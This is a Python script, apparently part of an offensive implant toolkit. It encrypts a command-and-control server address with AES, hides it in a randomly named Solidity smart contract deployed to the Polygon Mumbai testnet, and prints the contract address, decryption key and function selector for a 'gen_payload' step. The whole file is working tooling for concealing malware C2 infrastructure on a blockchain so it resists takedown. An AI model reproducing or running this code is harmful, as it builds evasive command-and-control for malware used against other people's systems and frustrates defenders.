from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import unpad
from Crypto import Random
import base64, secrets, hashlib
import string, random
import subprocess, os, re, colorama
from colorama import Fore, Back, Style
from Crypto.Hash import keccak

C2ServerIP = "C2_DOMAIN_HERE!"

def _pad(s):
    bs = AES.block_size
    return s + (bs - len(s) % bs) * chr(bs - len(s) % bs)

@staticmethod
def _unpad(s):
    return s[:-ord(s[len(s)-1:])]

def AESencrypt(key, raw):
        raw = _pad(raw)
        iv = Random.new().read(AES.block_size)
        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
        return base64.b64encode(iv + cipher.encrypt(raw.encode()))

def AESdecrypt(key, enc):
        enc = base64.b64decode(enc)
        iv = enc[:AES.block_size]
        cipher = AES.new(key, AES.MODE_CFB, iv, segment_size=128)
        return _unpad(cipher.decrypt(enc[AES.block_size:])).decode('utf-8')

def get_random_name():
    random_name = []
    random_name += ''.join(random.choice(string.ascii_uppercase) for i in range(10))
    random_name +=''.join(random.choice(string.ascii_lowercase) for i in range(10))
    
    random.shuffle(random_name)
    
    random_name = ''.join(random_name)
    return random_name

def rewrite_config(RandomContractName):
    fin = open("./SmartContractDeployment/scripts/deploy.js", "rt")
    #read file contents to string
    data = fin.read()
    #replace all occurrences of the required string
    data = data.replace('CHANGEHERE', RandomContractName)
    #close the input file
    fin.close()
    #open the input file in write mode
    fin = open("./SmartContractDeployment/scripts/deploy.js", "wt")
    #overrite the input file with the resulting data
    fin.write(data)
    #close the file
    fin.close()

def contact_generator():
    C2DecryptKey = get_random_bytes(16)

    RandomContractName = get_random_name()
    C2Encrypted = AESencrypt(C2DecryptKey, C2ServerIP)
    ContractRandomVarName = get_random_name()

    rewrite_config(RandomContractName)

    fin = open("./ContractTemplate.sol", "rt")
    fout = open(f"./SmartContractDeployment/contracts/{RandomContractName}.sol", "wt")
    for line in fin:
        fout.write(line.replace('RANDOMNAME', RandomContractName).replace('CHANGEME_C2VAR', ContractRandomVarName).replace('CHANGEME_VALUE_C2', C2Encrypted.decode()))

    fin.close()
    fout.close()

    fin = open("./Template_1_deploy_contracts.js", "rt")
    fout = open(f"./SmartContractDeployment/scripts/deploy.js", "wt")
    for line in fin:
        fout.write(line.replace('CHANGEHERE', RandomContractName))

    fin.close()
    fout.close()

    os.system(f"/usr/lib/node_modules/solc/solc.js --abi ./SmartContractDeployment/contracts/{RandomContractName}.sol -o ContractBuild")
    os.system(f"/usr/lib/node_modules/solc/solc.js --bin ./SmartContractDeployment/contracts/{RandomContractName}.sol -o ContractBuild")
    os.system(f"/home/user/go/bin/abigen --bin=./ContractBuild/SmartContractDeployment_contracts_{RandomContractName}_sol_{RandomContractName}.bin --abi=./ContractBuild/SmartContractDeployment_contracts_{RandomContractName}_sol_{RandomContractName}.abi --pkg=store --out=./ContractBuild/{RandomContractName}.go")
    p = subprocess.Popen(f"cd SmartContractDeployment && npx hardhat run scripts/deploy.js --network polygon_mumbai", stdout=subprocess.PIPE, shell=True)

    output = str(p.communicate())
    regex = r"(?!address: )0x[A-Za-f0-9]{40}"
    matches = re.search(regex, output).group(0)


    keccak_hash = keccak.new(digest_bits=256)
    ContractABICalc = ContractRandomVarName + "()"

    print(f"Calculating keccak from :: {ContractABICalc}")

    keccak_hash.update(ContractABICalc.encode("utf-8"))
    contractKeccak = keccak_hash.hexdigest()[:8]

    print(f"\n\nContract address :: {matches}")
    print(f"Encrypted C2 address :: {C2Encrypted.decode()}")
    print(f"Contract key :: {base64.b64encode(C2DecryptKey).decode()}")
    print(f"Generated contract variable name :: {ContractRandomVarName}")
    print(f"Contract keccak :: {contractKeccak}")
    print(f"\n\n{Fore.GREEN}gen_payload primaryServerIP:port {matches} {base64.b64encode(C2DecryptKey).decode()} {contractKeccak}{Style.RESET_ALL}\n")


contact_generator()
